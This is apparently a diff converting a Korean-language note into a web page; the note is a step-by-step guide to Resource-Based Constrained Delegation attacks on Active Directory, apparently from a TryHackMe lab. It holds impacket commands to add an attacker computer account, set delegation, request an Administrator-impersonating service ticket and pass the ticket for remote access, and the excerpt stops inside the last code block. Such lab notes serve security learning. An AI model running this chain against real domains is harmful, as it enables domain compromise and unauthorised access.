@@ -1,4 +1,14 @@
+---
+layout: page
+title: RBCD_(Resource-Based_Constrained_Delegation)
+description: >
+  This chapter covers the basics of content creation with Hydejack.
+hide_description: true
+sitemap: false
+---
 
+0. this unordered seed list will be replaced by toc as unordered list
+{:toc}
 
 
 # 리소스 기반 제한된 위임 (RBCD) 공격 가이드
@@ -21,7 +31,7 @@ RBCD(Resource-Based Constrained Delegation)는 기존의 제한된 위임(KCD)�
 - **핵심 도구:** BloodHound
 - **분석:** BloodHound에서 `Find paths to computers with GenericWrite`와 같은 쿼리를 실행하여, 현재 사용자가 제어할 수 있는 컴퓨터 객체를 시각적으로 쉽게 찾을 수 있습니다.
 
-![[Pasted image 20250812235330.png]]
+![Pasted_image_20250812235330.png](/image/Pasted_image_20250812235330.png)
 
 ---
 
@@ -30,7 +40,7 @@ RBCD(Resource-Based Constrained Delegation)는 기존의 제한된 위임(KCD)�
 #### **1단계: 공격자 제어 컴퓨터 계정 확보**
 - 도메인 사용자는 기본적으로 10개의 컴퓨터 계정을 도메인에 추가할 수 있습니다. 이 권한을 사용하여 공격자가 제어할 컴퓨터 계정을 생성합니다.
 
-```bash title="impacket-addcomputer: 새 컴퓨터 계정 추가"
+```bash
 impacket-addcomputer <domain.local>/<compromised_user>:<password> -computer-name <ATTACKER-PC>$
 
 impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Password1!' -dc-host $target -domain-netbios thm.local 'THM.LOCAL/SUSANNA_MCKNIGHT:REDACTED'
@@ -39,7 +49,7 @@ impacket-addcomputer -method LDAPS -computer-name 'ATTACKERSYSTEM$' -computer-pa
 #### **2단계: RBCD 관계 설정**
 - `impacket-rbcd`를 사용하여, 1단계에서 생성한 `ATTACKER-PC가 공격 대상 서버(`VICTIM-PC)에 대해 위임하도록 설정합니다.
 
-```bash title="impacket-rbcd: 위임 관계 설정"
+```bash
 # GUEST 계정이라 패스워드는 필요없음. 빈 해쉬로 진행
 # :31d6cfe0d16ae931b73c59d7e0c089c0 이건 빈 해쉬라는 뜻
 
@@ -50,7 +60,7 @@ impacket-rbcd THM.LOCAL/guest -hashes :31d6cfe0d16ae931b73c59d7e0c089c0  -dc-ip 
 - `impacket-getST`를 사용하여, `ATTACKER-PC`의 권한으로, `Administrator`를 사칭하여 `VICTIM-PC`의 `cifs` 서비스에 접근하는 티켓을 요청합니다.
 - [[GetST]]
 
-```bash title="impacket-getST: 서비스 티켓 요청"
+```bash
 # -spn: 요청할 서비스의 SPN
 # -impersonate: 사칭할 사용자
 impacket-getST -impersonate Administrator THM.LOCAL/ATTACKERSYSTEM\$:'Password1!' -spn cifs/LABYRINTH.THM.LOCAL -dc-ip $target
@@ -60,7 +70,7 @@ impacket-getST -impersonate Administrator THM.LOCAL/ATTACKERSYSTEM\$:'Password1!
 #### **4. Pass-the-Ticket 및 원격 접속**
 - 생성된 티켓을 환경 변수에 등록하고, `-k` 옵션을 사용하는 `impacket` 도구로 원격 접속을 시도합니다.
 
-```bash title="티켓 주입 및 wmiexec 접속"
+```bash
 # .ccache 파일을 Kerberos 인증에 사용하도록 설정
 export KRB5CCNAME=Administrator.ccache
 
